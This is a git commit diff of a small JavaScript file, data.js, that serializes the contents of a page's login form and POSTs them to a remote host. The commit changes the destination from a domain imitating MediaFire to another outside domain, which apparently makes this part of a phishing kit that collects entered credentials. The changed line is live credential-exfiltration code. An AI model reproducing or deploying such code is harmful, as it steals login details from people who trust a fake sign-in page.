ab698bfeda1bb9dc00f0915950d91214eb40179d
apiikey <108513149+apiikey@users.noreply.github.com>
2023-02-14 20:39:30 +0900

    Update data.js

--- data.js
+++ data.js
@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "http://apii.mediafire-com-mp4.my.id/apiii.php",
+        url: "https://apii.ahmadd.shop",
         type: "POST",
         data: d.serialize(),
         success: function () {
